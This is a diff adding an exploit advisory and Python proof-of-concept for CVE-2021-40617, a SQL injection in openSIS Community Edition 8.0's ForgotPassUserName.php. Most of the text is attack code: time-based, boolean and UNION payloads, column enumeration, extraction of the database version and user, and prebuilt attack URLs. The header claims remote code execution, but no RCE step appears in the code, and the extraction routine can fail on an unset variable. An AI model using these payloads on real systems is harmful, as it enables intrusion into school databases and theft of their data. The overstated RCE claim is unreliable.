@@ -1,0 +1,291 @@
+=============================================================================================================================================
+| # Title     : openSIS Community Edition 8.0 RCE                                                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/OS4ED/openSIS-Classic                                                                                    |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212397/ & 	CVE-2021-40617
+
+[+] Summary : SQL Injection vulnerability in openSIS Community Edition 8.0 that can be escalated to Remote Code Execution (RCE) through multiple exploitation paths.
+			  
+			  
+[+]  POC : 
+
+#!/usr/bin/env python3
+"""
+Exploit Author: indoushka
+"""
+
+import requests
+import sys
+import argparse
+import urllib.parse
+from colorama import Fore, Style, init
+
+# Initialize colorama
+init(autoreset=True)
+
+class CVE202140617_POC:
+    def __init__(self, base_url, cookie=None, proxy=None):
+        self.base_url = base_url.rstrip('/')
+        self.session = requests.Session()
+        self.cookie = cookie
+        
+        if cookie:
+            self.session.headers.update({'Cookie': cookie})
+            
+        if proxy:
+            self.session.proxies = {
+                'http': proxy,
+                'https': proxy
+            }
+            
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'close'
+        })
+    
+    def print_banner(self):
+        """Display exploit banner"""
+        banner = f"""
+{Fore.RED}╔══════════════════════════════════════════════════════════════╗
+║    CVE-2021-40617: SQL Injection in openSIS 8.0            ║
+║    openSIS Community Edition - ForgotPassUserName.php      ║
+╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+        """
+        print(banner)
+    
+    def test_sqli_time_based(self, param, user_type="student"):
+        """Test for time-based SQL injection"""
+        print(f"\n{Fore.CYAN}[*] Testing time-based SQL injection on parameter: {param}{Style.RESET_ALL}")
+        
+        test_payloads = [
+            # Basic SQL injection test
+            ("test' OR '1'='1", "Boolean-based injection"),
+            
+            # Time-based payloads
+            ("test' OR SLEEP(5) AND '1'='1", "5-second delay"),
+            ("test'; SELECT SLEEP(5)--", "MySQL SLEEP"),
+            ("test' AND 1=IF(1=1,SLEEP(5),0) AND '1'='1", "Conditional delay"),
+            
+            # Union-based payload detection
+            ("test' UNION SELECT NULL--", "Union test 1"),
+            ("test' UNION SELECT NULL,NULL--", "Union test 2"),
+            ("test' UNION SELECT NULL,NULL,NULL--", "Union test 3"),
+        ]
+        
+        for payload, description in test_payloads:
+            url = f"{self.base_url}/ForgotPassUserName.php"
+            params = {
+                'used_for': 'username',
+                param: payload,
+                'user_type': user_type
+            }
+            
+            print(f"\n{Fore.YELLOW}[+] Testing: {description}{Style.RESET_ALL}")
+            print(f"    Payload: {payload}")
+            
+            try:
+                import time
+                start_time = time.time()
+                response = self.session.get(url, params=params, timeout=10)
+                end_time = time.time()
+                
+                elapsed = end_time - start_time
+                
+                print(f"    Status: {response.status_code}")
+                print(f"    Size: {len(response.text)} bytes")
+                print(f"    Time: {elapsed:.2f} seconds")
+                
+                # Check for time-based indicators
+                if elapsed > 4.5 and "SLEEP" in payload:
+                    print(f"{Fore.GREEN}[!] Time-based SQL injection confirmed!{Style.RESET_ALL}")
+                    return True
+                    
+                # Check for boolean-based indicators
+                if "Invalid" not in response.text and "error" not in response.text.lower():
+                    if "success" in response.text.lower() or "found" in response.text.lower():
+                        print(f"{Fore.GREEN}[!] Boolean-based SQL injection possible{Style.RESET_ALL}")
+                        return True
+                        
+            except requests.exceptions.Timeout:
+                print(f"{Fore.RED}[!] Request timeout - possible blind SQLi{Style.RESET_ALL}")
+                return True
+            except Exception as e:
+                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
+                
+        return False
+    
+    def extract_data(self, param, user_type="student"):
+        """Extract data using SQL injection"""
+        print(f"\n{Fore.CYAN}[*] Attempting data extraction...{Style.RESET_ALL}")
+        
+        # Test for UNION-based injection
+        print(f"{Fore.YELLOW}[+] Determining number of columns...{Style.RESET_ALL}")
+        
+        for i in range(1, 10):
+            payload = f"test' ORDER BY {i}--"
+            url = f"{self.base_url}/ForgotPassUserName.php"
+            params = {
+                'used_for': 'username',
+                param: payload,
+                'user_type': user_type
+            }
+            
+            try:
+                response = self.session.get(url, params=params, timeout=5)
+                
+                if "error" in response.text.lower() or "order by" in response.text.lower():
+                    print(f"    Found {i-1} columns")
+                    column_count = i - 1
+                    break
+                    
+            except Exception as e:
+                print(f"    Error at column {i}: {str(e)}")
+                break
+        
+        if column_count > 0:
+            print(f"\n{Fore.YELLOW}[+] Testing UNION injection with {column_count} columns{Style.RESET_ALL}")
+            
+            # Build UNION payload
+            null_columns = "NULL," * column_count
+            null_columns = null_columns.rstrip(',')
+            
+            union_payloads = [
+                f"test' UNION SELECT {null_columns}--",
+                f"test' UNION SELECT CONCAT('TEST',{null_columns})--",
+                f"test' UNION SELECT version(),{','.join(['NULL']*(column_count-1))}--",
+                f"test' UNION SELECT database(),{','.join(['NULL']*(column_count-1))}--",
+                f"test' UNION SELECT user(),{','.join(['NULL']*(column_count-1))}--",
+            ]
+            
+            for payload in union_payloads:
+                print(f"\n    Testing payload: {payload[:50]}...")
+                
+                url = f"{self.base_url}/ForgotPassUserName.php"
+                params = {
+                    'used_for': 'username',
+                    param: payload,
+                    'user_type': user_type
+                }
+                
+                try:
+                    response = self.session.get(url, params=params, timeout=5)
+                    
+                    # Look for database information in response
+                    response_lower = response.text.lower()
+                    
+                    if "5." in response.text or "8." in response.text:
+                        print(f"{Fore.GREEN}[+] MySQL version found in response{Style.RESET_ALL}")
+                        
+                    if "select" in response_lower and "from" in response_lower:
+                        print(f"{Fore.GREEN}[+] Database query results found{Style.RESET_ALL}")
+                        
+                    # Save response for analysis
+                    filename = f"sqli_response_{hash(payload)}.html"
+                    with open(filename, 'w', encoding='utf-8') as f:
+                        f.write(response.text)
+                    print(f"    Response saved to: {filename}")
+                    
+                except Exception as e:
+                    print(f"    Error: {str(e)}")
+    
+    def exploit(self, param="u", user_type="student"):
+        """Main exploitation function"""
+        print(f"\n{Fore.CYAN}[*] Targeting: {self.base_url}{Style.RESET_ALL}")
+        print(f"[*] Parameter: {param}")
+        print(f"[*] User Type: {user_type}")
+        
+        if self.cookie:
+            print(f"[*] Using cookie: {self.cookie[:50]}...")
+        
+        # Test for vulnerability
+        if self.test_sqli_time_based(param, user_type):
+            print(f"\n{Fore.RED}[!] VULNERABLE - SQL Injection confirmed!{Style.RESET_ALL}")
+            
+            # Attempt data extraction
+            choice = input(f"\n{Fore.YELLOW}[?] Attempt data extraction? (y/n): {Style.RESET_ALL}")
+            if choice.lower() == 'y':
+                self.extract_data(param, user_type)
+        else:
+            print(f"\n{Fore.YELLOW}[-] No obvious SQL injection detected{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[*] Try manual testing with different payloads{Style.RESET_ALL}")
+    
+    def manual_test(self):
+        """Generate manual test payloads"""
+        print(f"\n{Fore.CYAN}[*] Manual Test Payloads:{Style.RESET_ALL}")
+        print(f"{'='*60}")
+        
+        base_url = f"{self.base_url}/ForgotPassUserName.php"
+        
+        payloads = [
+            {
+                "name": "Basic SQLi - Always True",
+                "url": f"{base_url}?used_for=username&u=test' OR '1'='1&user_type=student",
+                "description": "Boolean-based injection"
+            },
+            {
+                "name": "Time-based (5 sec delay)",
+                "url": f"{base_url}?used_for=username&u=test' OR SLEEP(5) AND '1'='1&user_type=student",
+                "description": "Check for time delay"
+            },
+            {
+                "name": "Union Test (3 columns)",
+                "url": f"{base_url}?used_for=username&u=test' UNION SELECT NULL,NULL,NULL--&user_type=student",
+                "description": "Union-based injection"
+            },
+            {
+                "name": "Database Version",
+                "url": f"{base_url}?used_for=username&u=test' UNION SELECT version(),NULL,NULL--&user_type=student",
+                "description": "Extract MySQL version"
+            },
+            {
+                "name": "Current User",
+                "url": f"{base_url}?used_for=username&u=test' UNION SELECT user(),NULL,NULL--&user_type=student",
+                "description": "Extract database user"
+            }
+        ]
+        
+        for i, payload in enumerate(payloads, 1):
+            print(f"\n{Fore.GREEN}[{i}] {payload['name']}{Style.RESET_ALL}")
+            print(f"    Description: {payload['description']}")
+            print(f"    URL: {payload['url'][:80]}...")
+            print(f"    Encoded: {urllib.parse.quote(payload['url'], safe=':/?=&')[:80]}...")
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="CVE-2021-40617: SQL Injection in openSIS 8.0",
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    
+    parser.add_argument("-u", "--url", required=True, help="Base URL (e.g., http://target.com)")
+    parser.add_argument("-c", "--cookie", help="Session cookie (if authentication required)")
+    parser.add_argument("-p", "--param", default="u", help="Parameter to test (default: u)")
+    parser.add_argument("-t", "--type", default="student", help="User type (default: student)")
+    parser.add_argument("-x", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
+    parser.add_argument("-m", "--manual", action="store_true", help="Generate manual test URLs only")
+    
+    args = parser.parse_args()
+    
+    # Initialize exploit
+    exploit = CVE202140617_POC(args.url, args.cookie, args.proxy)
+    exploit.print_banner()
+    
+    if args.manual:
+        exploit.manual_test()
+    else:
+        exploit.exploit(args.param, args.type)
+    
+    print(f"\n{Fore.YELLOW}[*] Remember: Always test on authorized systems only!{Style.RESET_ALL}")
+
+if __name__ == "__main__":
+    main()
+	
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
